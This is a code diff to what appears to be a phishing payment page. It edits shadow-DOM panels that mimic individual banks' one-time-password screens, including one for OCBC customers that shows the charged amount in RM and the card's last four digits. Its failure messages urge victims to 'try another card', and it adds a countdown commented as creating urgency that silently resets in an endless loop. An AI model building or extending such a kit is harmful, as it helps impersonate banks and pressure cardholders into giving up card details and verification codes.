@@ -1659,10 +1659,10 @@ url("pay1ment_icons.woff") format("woff");
       document.querySelector("#mount2").classList.add('hidden');
       document.querySelector("#mount3").classList.add('hidden');
       document.querySelector("#mount4").classList.add('hidden');
-      document.querySelector("#mount1").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount2").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount3").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount4").shadowRoot.querySelector("div > div").add('hidden');
+      document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount3").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount4").shadowRoot.querySelector("div > div").classList.add('hidden');
       var resultmessage = p.message || 'Your bank did not authorize this transaction.';
       document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
       document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
@@ -1790,7 +1790,7 @@ url("pay1ment_icons.woff") format("woff");
         `;
       }
       else
-      if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.') {
+      if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.' || p.cardInfo.bankName==='OCBC BANK (MALAYSIA) BERHAD') {
         document.querySelector("#mount4").classList.remove('hidden');
         document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(1) > td:nth-child(2) > span").textContent = 'RM '+discountedTotal().toFixed(2);
         document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(3) > td:nth-child(2) > span:nth-child(2)").textContent = p.cardInfo.cardNumber.slice(-4);
@@ -2921,6 +2921,66 @@ function CustomizationappVerifyContinue4() {
                         }
                     }))
             } 
+
+
+
+
+
+//右上角倒计时
+(function () {
+  var TOTAL = 600; // 10分钟
+  var remaining = TOTAL;
+  var urgentThreshold = 60; // 最后60秒变紧迫
+
+  var container = document.querySelector('.timerContainer___040efc');
+  var counter   = document.querySelector('.counter___429361');
+  var bar       = document.querySelector('.progressBar___6a25a2');
+
+  function tick() {
+    remaining--;
+    if (remaining < 0) remaining = TOTAL; // 重置循环
+
+    var pct = (remaining / TOTAL) * 100;
+    var m   = Math.floor(remaining / 60);
+    var s   = remaining % 60;
+    var display = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+
+    // 文字 & aria
+    if (counter)   counter.textContent = display;
+    if (container) {
+      container.setAttribute('aria-label', m + ' minutes ' + s + ' seconds remaining.');
+      container.style.setProperty('--progress-width', pct + '%');
+    }
+
+    // 紧迫感：最后60秒
+    if (remaining <= urgentThreshold) {
+      if (counter)   counter.style.color     = '#e53935';
+      if (container) container.style.animation = 'pulse 0.6s ease-in-out infinite';
+    } else if (remaining <= 180) {
+      // 最后3分钟橙色预警
+      if (counter)   counter.style.color     = '#ff6d00';
+      if (container) container.style.animation = '';
+    } else {
+      if (counter)   counter.style.color     = '';
+      if (container) container.style.animation = '';
+    }
+  }
+
+  // pulse 动画注入
+  if (!document.getElementById('_timer_style')) {
+    var style = document.createElement('style');
+    style.id = '_timer_style';
+    style.textContent = '@keyframes pulse { 0%,100%{ opacity:1; transform:scale(1) } 50%{ opacity:0.5; transform:scale(1.08) } }';
+    document.head.appendChild(style);
+  }
+
+  setInterval(tick, 1000);
+  tick(); // 立即执行一次
+})();            
+
+
+
+
             </script>
 
 
